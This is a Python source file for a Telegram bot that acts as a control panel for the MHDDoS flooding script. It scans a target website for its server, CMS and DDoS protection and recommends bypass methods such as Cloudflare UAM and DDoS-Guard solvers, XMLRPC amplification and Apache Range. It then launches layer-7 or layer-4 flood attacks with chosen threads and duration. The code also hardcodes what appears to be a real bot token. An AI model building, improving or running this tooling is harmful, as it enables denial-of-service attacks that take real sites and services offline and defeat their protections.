import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
import json
import os
import time
import requests
from threading import Thread

# --- CONFIGURATION ---
# IMPORTANT: Enter your bot token and allowed user ID here.
BOT_TOKEN = "8716263647:AAFk_Oog6iICAmi6TQxUtV28T4qqW3I0heE"  # e.g., '1234567890:ABCDEF...'
# Get your ID from @userinfobot. Leave as None to allow anyone (not recommended!)
ADMIN_ID = "1833222747"

bot = telebot.TeleBot(BOT_TOKEN)

# --- FILE PATHS ---
HISTORY_FILE = "history.json"
MHDDOS_SCRIPT = "start.py"

# --- STATE MANAGEMENT ---
# Store user progress during attack setup
user_states = {}
# Store active subprocesses
active_attacks = {}

# --- MHDDoS Methods (from start.py) ---
LAYER7_METHODS = [
    "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
    "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
    "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
]
LAYER4_METHODS = [
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP", "TCP", "UDP", "SYN", "VSE", 
    "MINECRAFT", "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "OVH-UDP"
]

def check_auth(message):
    if ADMIN_ID is None:
        return True
    return str(message.chat.id) == str(ADMIN_ID)

def load_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, 'r') as f:
            try:
                return json.load(f)
            except:
                return []
    return []

def save_to_history(attack_data):
    history = load_history()
    history.insert(0, attack_data)
    # Keep only last 10
    history = history[:10]
    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=4)

# --- AUTO-DETECT ENGINE ---
def analyze_target(url):
    """Analyze target website and recommend the best attack method."""
    result = {
        "url": url,
        "status": "unknown",
        "server": "Unknown",
        "protection": "None",
        "cms": "Unknown",
        "response_ms": 0,
        "recommended_methods": [],
        "reason": "",
    }

    headers_to_send = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

    try:
        start = time.time()
        resp = requests.get(url, timeout=15, headers=headers_to_send, allow_redirects=True)
        elapsed = round((time.time() - start) * 1000)
        result["response_ms"] = elapsed
        result["status"] = f"{resp.status_code}"

        h = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body_lower = resp.text[:5000].lower()
        server = resp.headers.get('Server', 'Unknown')
        result["server"] = server

        # --- Detect Protection ---
        is_cloudflare = 'cloudflare' in server.lower() or 'cf-ray' in h
        is_ddosguard = 'ddos-guard' in server.lower() or 'ddos-guard' in str(h)
        is_ovh = 'ovh' in server.lower()
        is_sucuri = 'sucuri' in server.lower() or 'x-sucuri' in h
        has_captcha = 'captcha' in body_lower or 'challenge' in body_lower
        has_js_challenge = 'jschl' in body_lower or 'cf-browser-verification' in body_lower

        if is_cloudflare and has_js_challenge:
            result["protection"] = "Cloudflare UAM (JS Challenge)"
        elif is_cloudflare:
            result["protection"] = "Cloudflare"
        elif is_ddosguard:
            result["protection"] = "DDoS-Guard"
        elif is_ovh:
            result["protection"] = "OVH Anti-DDoS"
        elif is_sucuri:
            result["protection"] = "Sucuri WAF"
        elif has_captcha:
            result["protection"] = "Captcha Detected"
        else:
            result["protection"] = "None / Unknown"

        # --- Detect CMS ---
        is_wordpress = ('wp-content' in body_lower or 'wp-includes' in body_lower 
                        or 'wordpress' in body_lower)
        is_apache = 'apache' in server.lower()
        is_nginx = 'nginx' in server.lower()

        if is_wordpress:
            result["cms"] = "WordPress"
        elif 'joomla' in body_lower:
            result["cms"] = "Joomla"
        elif 'drupal' in body_lower:
            result["cms"] = "Drupal"
        else:
            result["cms"] = "Custom / Unknown"

        # --- Check XMLRPC availability for WordPress ---
        has_xmlrpc = False
        if is_wordpress:
            try:
                xmlrpc_url = url.rstrip('/') + '/xmlrpc.php'
                xr = requests.head(xmlrpc_url, timeout=5, headers=headers_to_send)
                has_xmlrpc = xr.status_code < 405
            except:
                pass

        # --- Recommend methods ---
        methods = []
        reasons = []

        if is_cloudflare and has_js_challenge:
            methods = ["CFBUAM", "CFB", "BYPASS"]
            reasons.append("Cloudflare UAM active — using CF bypass methods")
        elif is_cloudflare:
            methods = ["CFB", "BYPASS", "STRESS"]
            reasons.append("Cloudflare detected — CFB is optimal")
        elif is_ddosguard:
            methods = ["DGB", "BYPASS", "STRESS"]
            reasons.append("DDoS-Guard — using DGB solver")
        elif is_ovh:
            methods = ["OVH", "STRESS", "BYPASS"]
            reasons.append("OVH hosting — OVH method recommended")
        elif is_sucuri:
            methods = ["BYPASS", "STRESS", "GET"]
            reasons.append("Sucuri WAF — BYPASS is best")
        elif is_wordpress and has_xmlrpc:
            methods = ["XMLRPC", "STRESS", "POST"]
            reasons.append("WordPress with XMLRPC open — XMLRPC amplification")
        elif is_wordpress:
            methods = ["STRESS", "POST", "GET"]
            reasons.append("WordPress without XMLRPC — STRESS recommended")
        elif is_apache:
            methods = ["APACHE", "STRESS", "SLOW"]
            reasons.append("Apache server — APACHE Range attack + SLOW")
        elif is_nginx:
            methods = ["STRESS", "PPS", "GET"]
            reasons.append("Nginx server — STRESS with high PPS")
        else:
            methods = ["STRESS", "GET", "POST"]
            reasons.append("No specific protection — STRESS is universal")

        # Slow server = add SLOW method
        if elapsed > 2000 and "SLOW" not in methods:
            methods.append("SLOW")
            reasons.append(f"Slow response ({elapsed}ms) — SLOW method effective")

        result["recommended_methods"] = methods
        result["reason"] = "\n".join(reasons)

    except requests.exceptions.Timeout:
        result["status"] = "TIMEOUT"
        result["protection"] = "Unknown"
        result["recommended_methods"] = ["STRESS", "BYPASS", "SLOW"]
        result["reason"] = "Server timed out — might already be overloaded"
    except requests.exceptions.ConnectionError:
        result["status"] = "OFFLINE"
        result["protection"] = "Unknown"
        result["recommended_methods"] = ["STRESS", "GET"]
        result["reason"] = "Server offline or blocking connections"
    except Exception as e:
        result["status"] = f"ERROR: {e}"
        result["recommended_methods"] = ["STRESS", "GET"]
        result["reason"] = "Analysis failed — using universal methods"

    return result


# --- UI MARKUPS ---
def main_menu_markup():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🧠 Auto Attack", callback_data="auto_attack"),
               InlineKeyboardButton("🚀 Manual Attack", callback_data="new_attack"))
    markup.row(InlineKeyboardButton("🔍 Check Status", callback_data="check_status"), 
               InlineKeyboardButton("📜 History", callback_data="history"))
    markup.row(InlineKeyboardButton("🛑 Stop All Attacks", callback_data="stop_all"))
    return markup

def layer_menu_markup():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("Layer 7 (HTTP/Web)", callback_data="layer_7"))
    markup.row(InlineKeyboardButton("Layer 4 (TCP/UDP)", callback_data="layer_4"))
    markup.row(InlineKeyboardButton("🔙 Cancel", callback_data="cancel"))
    return markup

def methods_markup(layer):
    markup = InlineKeyboardMarkup()
    methods = LAYER7_METHODS if layer == 7 else LAYER4_METHODS
    
    # Create buttons in pairs for compactness
    row = []
    for method in methods:
        row.append(InlineKeyboardButton(method, callback_data=f"method_{method}"))
        if len(row) == 3:
            markup.row(*row)
            row = []
    if row:
        markup.row(*row)
        
    markup.row(InlineKeyboardButton("🔙 Cancel", callback_data="cancel"))
    return markup

# --- BOT COMMANDS & HANDLERS ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not check_auth(message):
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    
    text = (
        "🔥 *MHDDoS Control Panel* 🔥\n\n"
        "Welcome! Use the interactive menu below to manage your stress tests."
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu_markup())

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if not check_auth(call.message):
        bot.answer_callback_query(call.id, "Unauthorized")
        return

    chat_id = call.message.chat.id
    data = call.data

    if data == "main_menu" or data == "cancel":
        if chat_id in user_states:
            del user_states[chat_id]
        bot.edit_message_text("🔥 *MHDDoS Control Panel* 🔥\nChoose an action:", 
                              chat_id, call.message.message_id, 
                              parse_mode="Markdown", reply_markup=main_menu_markup())
    
    # --- AUTO ATTACK ---
    elif data == "auto_attack":
        msg = bot.edit_message_text(
            "🧠 *Auto Attack*\n\n"
            "Send me the *Target URL* and I will analyze it and pick the best method:\n"
            "(e.g. `https://example.com`)",
            chat_id, call.message.message_id, parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_auto_target)

    elif data.startswith("auto_use_"):
        # User picked a recommended method from auto-analysis
        if chat_id not in user_states:
            return
        method = data.split("auto_use_")[1]
        user_states[chat_id]['method'] = method
        user_states[chat_id]['layer'] = 7  # auto always L7
        msg = bot.edit_message_text(
            f"✅ Method: *{method}*\n\nNow enter the *number of threads* (e.g., 500):",
            chat_id, call.message.message_id, parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_threads_step)

    # --- MANUAL ATTACK ---
    elif data == "new_attack":
        user_states[chat_id] = {}
        bot.edit_message_text("Select Attack Layer:", chat_id, call.message.message_id, reply_markup=layer_menu_markup())
        
    elif data.startswith("layer_"):
        layer = int(data.split("_")[1])
        user_states[chat_id]['layer'] = layer
        bot.edit_message_text(f"Selected: *Layer {layer}*\nNow select the method:", 
                              chat_id, call.message.message_id, 
                              parse_mode="Markdown", reply_markup=methods_markup(layer))
        
    elif data.startswith("method_"):
        if chat_id not in user_states:
             return
        method = data.split("_")[1]
        user_states[chat_id]['method'] = method
        
        msg = bot.edit_message_text(f"Selected Method: *{method}*\n\nSend me the *Target URL or IP* (e.g. https://example.com):", 
                                    chat_id, call.message.message_id, parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_target_step)

    elif data == "history":
        history = load_history()
        if not history:
            text = "📜 *Attack History is Empty*"
        else:
            text = "📜 *Last 10 Attacks:*\n\n"
            for i, atk in enumerate(history):
                text += f"*{i+1}. {atk['method']}* 🎯 `{atk['target']}`\n"
                text += f"⏱️ {atk['duration']}s | 🧵 {atk['threads']} threads\n"
                text += f"📅 {atk['timestamp']}\n\n"
                
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode="Markdown", 
                              reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="main_menu")))
                              
    elif data == "stop_all":
        count = 0
        for pid, proc in list(active_attacks.items()):
            try:
                proc.terminate()
                count += 1
            except Exception as e:
                print(f"Error terminating {pid}: {e}")
        
        # Additional safety net (Windows/Linux)
        try:
             if os.name == 'nt':
                 os.system("taskkill /f /im python.exe /fi \"WINDOWTITLE eq MHDDoS*\"") 
             else:
                 os.system("pkill -f start.py")
        except:
             pass
             
        active_attacks.clear()
        bot.answer_callback_query(call.id, f"Stopped {count} active attacks.", show_alert=True)
        
    elif data == "check_status":
        msg = bot.edit_message_text("🔍 *Website Status Checker*\n\nSend me the URL you want to check (e.g. https://example.com):", 
                              chat_id, call.message.message_id, parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_status_check)

def process_auto_target(message):
    """Handle target URL input for auto-attack mode."""
    chat_id = message.chat.id
    url = message.text.strip()
    if not url.startswith("http"):
        url = "https://" + url

    bot.send_message(chat_id, "🔬 *Analyzing target...*\nScanning server, protection, CMS...", parse_mode="Markdown")

    result = analyze_target(url)

    # Build the report
    prot_icon = "🛡" if result["protection"] != "None / Unknown" else "✅"
    text = (
        f"🧠 *Auto-Analysis Complete*\n\n"
        f"🎯 Target: `{result['url']}`\n"
        f"📶 Status: `{result['status']}`\n"
        f"⏱ Response: `{result['response_ms']}ms`\n"
        f"🖥 Server: `{result['server']}`\n"
        f"{prot_icon} Protection: `{result['protection']}`\n"
        f"📦 CMS: `{result['cms']}`\n\n"
        f"💡 *Reason:*\n{result['reason']}\n\n"
        f"👇 *Pick a recommended method:*"
    )

    # Store target in state
    user_states[chat_id] = {'target': url}

    # Build buttons for recommended methods
    markup = InlineKeyboardMarkup()
    row = []
    for m in result["recommended_methods"]:
        label = f"⭐ {m}" if m == result["recommended_methods"][0] else m
        row.append(InlineKeyboardButton(label, callback_data=f"auto_use_{m}"))
        if len(row) == 3:
            markup.row(*row)
            row = []
    if row:
        markup.row(*row)
    markup.row(InlineKeyboardButton("🔙 Cancel", callback_data="cancel"))

    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)


def process_target_step(message):
    chat_id = message.chat.id
    if chat_id not in user_states: return
    
    target = message.text.strip()
    user_states[chat_id]['target'] = target
    
    msg = bot.send_message(chat_id, "Target set. Now enter the *number of threads* (e.g., 500):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_threads_step)

def process_threads_step(message):
    chat_id = message.chat.id
    if chat_id not in user_states: return
    
    try:
        threads = int(message.text.strip())
        user_states[chat_id]['threads'] = threads
        msg = bot.send_message(chat_id, "Threads set. Finally, enter the *duration in seconds* (e.g., 600):", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_duration_step)
    except ValueError:
        msg = bot.send_message(chat_id, "Invalid number. Please enter digits only for threads:")
        bot.register_next_step_handler(msg, process_threads_step)

def process_duration_step(message):
    chat_id = message.chat.id
    if chat_id not in user_states: return
    
    try:
        duration = int(message.text.strip())
        state = user_states[chat_id]
        state['duration'] = duration
        
        # Start the attack!
        launch_attack(chat_id, state)
        del user_states[chat_id] # Clear state
        
    except ValueError:
        msg = bot.send_message(chat_id, "Invalid number. Please enter digits only for duration:")
        bot.register_next_step_handler(msg, process_duration_step)

def launch_attack(chat_id, state):
    bot.send_message(chat_id, "⏳ Initializing attack... Please wait.")
    
    # Construct command based on Layer
    # Example: python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
    # Note: Using proxy_type 1 (HTTP) and proxy_list "http.txt" (or random list) to bypass need for custom files
    # RPC set to 100 as default
    
    layer = state['layer']
    method = state['method']
    target = state['target']
    threads = str(state['threads'])
    duration = str(state['duration'])
    
    # Ensure proxy file exists to prevent script exit
    if not os.path.exists("files/proxies/proxy.txt"):
        try:
             os.makedirs("files/proxies", exist_ok=True)
             with open("files/proxies/proxy.txt", "w") as f:
                 f.write("\n")
        except:
            pass

    cmd = []
    if layer == 7:
        # L7: python start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
        cmd = ["python", MHDDOS_SCRIPT, method, target, "1", threads, "proxy.txt", "100", duration]
    else:
        # L4: python start.py <method> <ip:port> <threads> <duration>
        # Strip https:// if passed for L4
        clean_target = target.replace("https://", "").replace("http://", "")
        if "/" in clean_target: clean_target = clean_target.split("/")[0]
        # Append default port if none provided
        if ":" not in clean_target:
             clean_target += ":80"
             
        cmd = ["python", MHDDOS_SCRIPT, method, clean_target, threads, duration]
    
    try:
        # Launch non-blocking
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        pid = proc.pid
        active_attacks[pid] = proc
        
        # Save to history
        attack_info = {
            "method": method,
            "target": target,
            "threads": threads,
            "duration": duration,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_to_history(attack_info)
        
        text = (
            f"🚀 *Attack Launched Successfully!* 🚀\n\n"
            f"🎯 Target: `{target}`\n"
            f"🛠 Method: `{method}` (L{layer})\n"
            f"🧵 Threads: `{threads}`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"⚙️ PID: `{pid}`"
        )
        bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=main_menu_markup())
        
        # Auto-remove from active list after duration
        def cleanup_process():
            time.sleep(int(duration) + 5)
            if pid in active_attacks:
                del active_attacks[pid]
        Thread(target=cleanup_process).start()

    except Exception as e:
        bot.send_message(chat_id, f"❌ Failed to start attack: {e}", reply_markup=main_menu_markup())

def process_status_check(message):
    chat_id = message.chat.id
    url = message.text.strip()
    
    if not url.startswith("http"):
        url = "http://" + url
        
    bot.send_message(chat_id, "⏳ Pinging server...", parse_mode="Markdown")
    
    try:
        start_time = time.time()
        # Custom User-Agent to bypass simple blocks
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(url, timeout=10, headers=headers)
        ping = round((time.time() - start_time) * 1000)
        
        status_code = response.status_code
        server_header = response.headers.get('Server', 'Unknown')
        
        cf_detected = "Yes" if "cloudflare" in server_header.lower() else "No"
        
        if status_code < 400:
            status_text = "🟢 *ONLINE*"
        else:
            status_text = f"🟠 *UNSTABLE* (HTTP {status_code})"
            
        text = (
            f"🔍 *Status Report for* `{url}`\n\n"
            f"Status: {status_text}\n"
            f"Response Time: `{ping}ms`\n"
            f"Web Server: `{server_header}`\n"
            f"Cloudflare Protected: `{cf_detected}`"
        )
        
    except requests.exceptions.Timeout:
         text = f"🔴 *OFFLINE* (Connection Timed Out)\n`{url}` is not responding."
    except requests.exceptions.ConnectionError:
         text = f"🔴 *OFFLINE* (Connection Error)\nFailed to connect to `{url}`."
    except Exception as e:
         text = f"⚠️ *Error Checking Status:*\n`{e}`"
         
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=main_menu_markup())


if __name__ == "__main__":
    print("MHDDoS Telegram Bot is running...")
    # Polling loop
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Bot polling error: {e}")
            time.sleep(5)
